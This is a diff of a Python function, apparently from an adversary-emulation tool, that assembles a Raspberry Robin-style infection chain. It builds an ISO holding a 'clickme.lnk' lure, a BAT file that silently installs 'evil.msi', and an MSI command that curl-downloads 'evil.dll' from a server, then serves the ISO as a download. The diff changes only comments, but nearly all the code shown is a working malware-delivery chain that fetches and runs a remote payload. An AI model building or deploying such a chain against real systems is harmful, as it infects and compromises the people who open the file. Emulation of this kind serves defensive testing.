@@ -23,6 +23,7 @@ def raspberryrobin(baseUrl) -> List[AceRoute]:
     routes.append(evilDllroute)
 
     # MSI: stage 2
+    # to execute multiple commands, need to wrap it in a "cmd /c ..."
     cmd = "cmd /c \"{} & {}\"".format(
         makeCmdFileDownloadWithCurl(
             url=baseUrl + '/evil.dll', 
@@ -35,7 +36,8 @@ def raspberryrobin(baseUrl) -> List[AceRoute]:
     msi = makeMsiFromCmd(cmd)
     msiFile = AceFile("evil.msi", msi)
 
-    # BAT: stage 1: make sure each line ends with \r\n, or it will not work
+    # BAT: stage 1
+    # make sure each line ends with \r\n, or it will not work
     bat = AceBytes(b"msiexec.exe /q /i evil.msi\r\n")
     batFile = makeAceFile('evil.bat', bat)
 
@@ -48,13 +50,13 @@ def raspberryrobin(baseUrl) -> List[AceRoute]:
     )
     lnkFile: AceFile = makeAceFile('clickme.lnk', lnkData)
 
-    # ISO: LNK entry point, stage 1 bat, stage 2 msi
+    # ISO: with LNK entry point, stage 1 bat, stage 2 msi
     container: AceBytes = makeIso(files = [
         batFile,
         lnkFile,
         msiFile,
     ])
-    containerFile: AceFile = makeAceFile('test.iso', container)
+    # containerFile: AceFile = makeAceFile('test.iso', container)
     isoRoute: AceRoute = AceRoute('/test.iso', container, download=True, downloadName='test.iso')
     routes.append(isoRoute)
 
